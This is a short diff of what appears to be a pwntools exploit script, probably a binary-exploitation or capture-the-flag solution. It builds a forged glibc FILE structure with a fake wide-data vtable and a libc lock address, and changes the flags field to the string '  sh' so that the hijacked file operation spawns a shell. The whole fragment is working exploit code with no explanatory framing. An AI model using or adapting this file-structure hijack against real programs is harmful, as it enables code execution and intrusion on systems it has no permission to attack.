@@ -102,7 +102,7 @@ io.sendlineafter(b"name: ", payload)
 
 
 fs = FileStructure()
-fs.flags = u32(b"dash")
+fs.flags = u32(b"  sh")
 fs.fileno = 1
 fs._lock = libc.sym["_IO_stdfile_1_lock"]
 fs._wide_data = fake_wide_vtable
